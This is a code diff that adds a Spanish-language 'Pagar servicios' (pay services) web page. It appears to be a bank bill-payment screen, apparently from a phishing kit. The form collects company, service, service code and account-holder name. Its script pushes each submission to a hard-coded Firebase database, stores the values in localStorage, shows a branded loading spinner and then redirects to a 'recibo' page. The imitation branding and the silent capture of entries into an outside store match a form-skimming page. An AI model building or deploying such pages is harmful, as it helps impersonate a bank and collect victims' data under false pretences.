@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagar servicios</title>
+<style>
+* { box-sizing: border-box; font-family: "Segoe UI", Arial, sans-serif; }
+body { margin: 0; background-color: #ffffff; color: #001b5e; }
+
+.header { background-color: #01256f; color: white; padding: 16px; font-size: 18px; font-weight: 500; text-align: left; }
+.container { padding: 20px; }
+label { display: block; margin-top: 20px; font-weight: 600; color: #01256f; font-size: 15px; }
+input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; margin-top: 8px; font-size: 16px; }
+.continue-btn { width: 100%; background-color: #d3d3d3; color: white; border: none; padding: 14px; border-radius: 30px; font-size: 17px; margin-top: 40px; cursor: not-allowed; opacity: 0.8; transition: 0.3s; }
+.continue-btn.active { background-color: #01256f; cursor: pointer; opacity: 1; }
+
+.loading-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 9999; }
+.loader-container { position: relative; width: 120px; height: 120px; }
+.loader-circle { position: absolute; top: 0; left: 0; width: 120px; height: 120px; border: 6px solid transparent; border-top: 6px solid #ff6600; border-radius: 50%; animation: spin 1.2s linear infinite; }
+.loader-logo { position: absolute; top: 50%; left: 50%; width: 70px; height: 70px; transform: translate(-50%,-50%); }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="header">Pagar servicios</div>
+
+<div class="container">
+  <input type="text" placeholder="Busca una empresa" id="empresa">
+  <label for="servicio">Servicio</label>
+  <input type="text" id="servicio" placeholder="">
+  <label for="codigo">Ingresa el código de servicio</label>
+  <input type="text" id="codigo" placeholder="Código">
+  <label for="titular">Ingresa el titular</label>
+  <input type="text" id="titular" placeholder="Nombre titular">
+  <button class="continue-btn" id="continuar" disabled>Continuar</button>
+</div>
+
+<div class="loading-modal" id="loadingModal">
+  <div class="loader-container">
+    <div class="loader-circle"></div>
+    <img src="images/lg_favicon_light.svg" alt="Logo" class="loader-logo">
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDvfMTYu_d_Vl0z-3Y8ld_YtcFLGgZmP0U",
+  authDomain: "bcpf-e0a42.firebaseapp.com",
+  databaseURL: "https://bcpf-e0a42-default-rtdb.firebaseio.com",
+  projectId: "bcpf-e0a42",
+  storageBucket: "bcpf-e0a42.firebasestorage.app",
+  messagingSenderId: "1030005921701",
+  appId: "1:1030005921701:web:0c15124cadf030280f7a4c",
+  measurementId: "G-SVYPBTLHDE"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const inputs = document.querySelectorAll('input[type="text"]');
+const btn = document.getElementById('continuar');
+const modal = document.getElementById('loadingModal');
+
+// Activar botón cuando todos los campos estén llenos
+inputs.forEach(input => {
+  input.addEventListener('input', () => {
+    const allFilled = Array.from(inputs).every(i => i.value.trim() !== "");
+    btn.classList.toggle('active', allFilled);
+    btn.disabled = !allFilled;
+  });
+});
+
+// Evento de continuar
+btn.addEventListener('click', async () => {
+  modal.style.display = 'flex';
+
+  const empresa = document.getElementById('empresa').value.trim();
+  const servicio = document.getElementById('servicio').value.trim();
+  const codigo = document.getElementById('codigo').value.trim();
+  const titular = document.getElementById('titular').value.trim();
+
+  // Guardar en Firebase
+  const pagosRef = ref(db, 'pagos');
+  const newPagoRef = push(pagosRef);
+  await set(newPagoRef, { empresa, servicio, codigo, titular, fecha: new Date().toISOString() });
+
+  // Guardar en localStorage
+  localStorage.setItem("empresa", empresa);
+  localStorage.setItem("servicio", servicio);
+  localStorage.setItem("codigoServicio", codigo);
+  localStorage.setItem("titular", titular);
+
+  setTimeout(() => {
+    modal.style.display = 'none';
+    window.location.href = "recibo";
+  }, 2000);
+});
+</script>
+
+</body>
+</html>
